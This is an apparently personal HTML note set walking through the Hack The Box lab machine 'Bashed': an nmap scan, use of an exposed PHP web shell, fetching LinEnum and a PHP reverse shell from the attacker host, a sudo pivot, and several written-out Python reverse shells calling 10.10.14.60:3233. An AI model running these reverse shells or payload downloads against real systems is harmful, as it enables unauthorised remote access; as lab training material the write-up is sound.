<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.68 Bashed</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.68 Bashed</h1><br/>root@kali:~/Desktop/HTB/Bashed# nmap -sC -sV -oN 10.10.10.68.txt 10.10.10.68<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-10 20:08 EDT<br />Nmap scan report for 10.10.10.68<br />Host is up (0.19s latency).<br />Not shown: 999 closed ports<br />PORT   STATE SERVICE VERSION<br />80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br />|_http-title: Arrexel&#39;s Development Site<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds<br /><br /><a href="http://10.10.10.68/dev/phpbash.min.php">http://10.10.10.68/dev/phpbash.min.php</a><br />    cat to /home/Arrexel/user.txt<br />        &gt;user flag<br /><br />in target web shell<br />    cd /dev/shm (used for shared memory space)<br />    wget <a href="http://10.10.14.60:80/LinEnum.sh">http://10.10.14.60:80/LinEnum.sh</a><br />    sh ./LinEnum.sh<br />---------------------------------------------------------------<br />-e \e[00;33m[+] We can sudo without supplying a password!\e[00m<br />Matching Defaults entries for www-data on bashed:<br />    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br /><br />User www-data may run the following commands on bashed:<br />    (scriptmanager : scriptmanager) NOPASSWD: ALL<br />-e <br /><br />-e \e[00;31m[-] Accounts that have recently used sudo:\e[00m<br />/home/arrexel/.sudo_as_admin_successful<br />-e <br />-------------------------------------------------------------<br /><br />in terminal<br />    mv <a href="file:///usr/share/laudanum/php/php-reverse-shell.php">/usr/share/laudanum/php/php-reverse-shell.php</a> to local dir and edit ip and port<br />    start python web server<br /><br />in web terminal<br />    cd /dev/shm<br />    wget <a href="http://10.10.14.60:8000/reverse-shell-php.php">http://10.10.14.60:8000/reverse-shell-php.php</a><br />    mv to /var/www/html/uploads/shell.php<br /><br />in terminal<br />    start a nc listener<br />  <br />in web interface<br />    navigate to <a href="http://10.10.10.68/uploads/shell.php">http://10.10.10.68/uploads/shell.php</a><br />   <br />in termial<br />    shell should be spawned in terminal<br />    <code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;  </code><br />    <br />    sudo -u scriptmanager whoami<br />        scriptmanager<br />    sudo -u scriptmanager  bash<br />        scriptmanager bash shell<br />        <br />        COULD NOT VI PROPERLY (NO ARROW KEYS)<br />         <code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br />         export TERM=screen<br />         still sucks, fuck it<br />         <br /><code>import socket,subprocess,os<br />s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br />s.connect((&quot;10.10.14.60&quot;,3233))<br />os.dup2(s.fileno(),0)<br />os.dup2(s.fileno(),1)<br />os.dup2(s.fileno(),2)<br />p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])</code><br /><br />seperate shell<br />    nc -nlvp 3233<br />    at the top of the minute, enjoyed the shell!!!<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />from pentestmonkey download a php reverse shell script. edit to call back to Kali<br />host on /var/www/html<br />wget <a href="http://10.10.14.60:80/3232.php">http://10.10.14.60:80/3232.php</a><br /><br /><br /><br /><br /><br /><br /><br /><br />echo “<code>import socket,subprocess,os” &gt;&gt; test.py<br />echo “s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)” &gt;&gt; test.py<br />echo &quot;s.connect((\&quot;10.10.14.60\&quot;,3233))&quot; &gt;&gt; test.py<br />echo “os.dup2(s.fileno(),0)” &gt;&gt; test.py<br />echo “os.dup2(s.fileno(),1)” &gt;&gt; test.py<br />echo “os.dup2(s.fileno(),2)” &gt;&gt; test.py<br />echo &quot;p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;])</code>&quot; &gt;&gt; test.py<br /><br />echo &quot;<code>&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.10.14.60\&quot;,3233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;</code>&quot; &gt; test.py </div></body></html>